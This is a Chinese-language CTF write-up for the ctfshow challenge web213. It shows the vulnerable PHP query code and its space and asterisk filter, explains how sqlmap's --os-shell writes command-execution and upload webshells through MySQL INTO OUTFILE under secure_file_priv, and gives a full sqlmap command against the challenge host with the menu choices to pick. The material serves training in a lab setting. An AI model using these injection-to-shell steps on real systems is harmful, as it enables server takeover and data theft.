&lt;h1 id=&#34;web213&#34;&gt;&lt;a href=&#34;#web213&#34; class=&#34;headerlink&#34; title=&#34;web213&#34;&gt;&lt;/a&gt;web213&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;练习使用--os-shell 一键getshell


查询语句
//拼接sql语句查找指定ID用户
$sql = &amp;quot;select id,username,pass from ctfshow_user where id = (&amp;#39;&amp;quot;.$id.&amp;quot;&amp;#39;) limit 0,1;&amp;quot;;


返回逻辑
//对查询字符进行解密
  function decode($id)&amp;#123;
    return strrev(base64_decode(strrev(base64_decode($id))));
  &amp;#125;
function waf($str)&amp;#123;
    return preg_match(&amp;#39;/ |\*/&amp;#39;, $str);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;过滤了 &lt;code&gt;空格&lt;/code&gt;、&lt;code&gt;*&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;--os-shell&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.&lt;code&gt;--os-shell&lt;/code&gt; 的本质&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在 sqlmap 或手工利用中，**&lt;code&gt;--os-shell&lt;/code&gt;** 并不是直接提供一个系统 shell，而是通过数据库权限绕路去获取命令执行。&lt;br&gt;其典型方式就是 —— &lt;strong&gt;往服务器写入两个 WebShell 文件&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;命令执行型 WebShell&lt;/strong&gt;：例如 &lt;code&gt;cmd.php&lt;/code&gt;，可以让攻击者通过访问页面并传参执行系统命令（&lt;code&gt;system()&lt;/code&gt;, &lt;code&gt;exec()&lt;/code&gt; 等）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;文件上传型 WebShell&lt;/strong&gt;：例如 &lt;code&gt;upload.php&lt;/code&gt;，提供上传文件功能，进一步落地木马或工具。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这类利用能否成功，完全取决于数据库账号的 &lt;strong&gt;文件写权限&lt;/strong&gt; + &lt;strong&gt;Web 路径的可控性&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.MySQL 导入导出与 &lt;code&gt;secure_file_priv&lt;/code&gt; 的作用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在 MySQL 里，如果要利用 &lt;code&gt;--os-shell&lt;/code&gt; 写文件，通常依赖于以下语句：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;SELECT ... INTO OUTFILE &amp;#39;/var/www/html/shell.php&amp;#39;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;或者&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;LOAD DATA INFILE &amp;#39;/tmp/file.txt&amp;#39; INTO TABLE ...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里是否能写文件，就由参数 &lt;strong&gt;&lt;code&gt;secure_file_priv&lt;/code&gt;&lt;/strong&gt; 控制：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;secure_file_priv = NULL&lt;/code&gt;&lt;/strong&gt;&lt;ul&gt;
&lt;li&gt;表示完全禁止 &lt;strong&gt;导入导出&lt;/strong&gt; 文件。&lt;/li&gt;
&lt;li&gt;攻击者无法通过 &lt;code&gt;INTO OUTFILE&lt;/code&gt; 写入 WebShell。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;secure_file_priv = /some/path/&lt;/code&gt;&lt;/strong&gt; （某个具体目录）&lt;ul&gt;
&lt;li&gt;表示仅允许在这个目录下导入&amp;#x2F;导出文件。&lt;/li&gt;
&lt;li&gt;如果这个目录 &lt;strong&gt;不在 Web 服务根目录下&lt;/strong&gt;，攻击者写入的 WebShell 无法被访问。&lt;/li&gt;
&lt;li&gt;但是攻击者仍可导出数据到该目录（数据外泄）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;secure_file_priv = &amp;#39;&amp;#39;&lt;/code&gt;（空值）&lt;/strong&gt;&lt;ul&gt;
&lt;li&gt;表示没有限制，可以在 &lt;strong&gt;任意目录&lt;/strong&gt; 下导入&amp;#x2F;导出文件。&lt;/li&gt;
&lt;li&gt;这是最危险的情况，攻击者可直接写到网站根目录，获取 WebShell。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;powershell&#34;&gt;python sqlmap.py -u &amp;quot;http://a8fb5c96-25eb-40a1-a21c-dd4744e3238e.challenge.ctf.show/api/index.php&amp;quot; --method=PUT --headers=&amp;quot;Content-Type:text/plain&amp;quot; --data &amp;quot;id=1&amp;quot; --referer=&amp;quot;ctf.show&amp;quot; --safe-url=&amp;quot;http://a8fb5c96-25eb-40a1-a21c-dd4744e3238e.challenge.ctf.show/api/getToken.php&amp;quot; --safe-freq=1 --tamper=ctfshow212sqlmap --os-shell
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;对于目标网站执行的脚本语言   –&amp;gt;   选择 [4] PHP&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;对于 WebShell 写向地址	      –&amp;gt;	选择 [1] commom loaction(s)&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;[1] common location(s) (默认)&lt;/strong&gt;&lt;ul&gt;
&lt;li&gt;sqlmap 会尝试一批常见的 Web 根目录（例如 &lt;code&gt;/var/www/html/&lt;/code&gt;、&lt;code&gt;/srv/www/htdocs/&lt;/code&gt; 等）。&lt;/li&gt;
&lt;li&gt;如果靶机是常规 &lt;code&gt;Linux + Nginx/Apache&lt;/code&gt;，选这个大多数情况能成功。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;[2] custom location(s)&lt;/strong&gt;&lt;ul&gt;
&lt;li&gt;手动输入一个路径（例如知道网站真实路径 &lt;code&gt;/home/ctf/web/&lt;/code&gt;）。&lt;/li&gt;
&lt;li&gt;适合已知路径的情况。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;[3] custom directory list file&lt;/strong&gt;&lt;ul&gt;
&lt;li&gt;提供一个包含很多可能路径的文件，sqlmap 会逐个尝试。&lt;/li&gt;
&lt;li&gt;适合你自己收集了目录字典时。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;[4] brute force search&lt;/strong&gt;&lt;ul&gt;
&lt;li&gt;sqlmap 会尝试暴力枚举目录，效率低，噪音大。&lt;/li&gt;
&lt;li&gt;一般不推荐（CTF 或靶机可以试，真实环境容易被发现）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250829161241567.png&#34; alt=&#34;image-20250829161241567&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
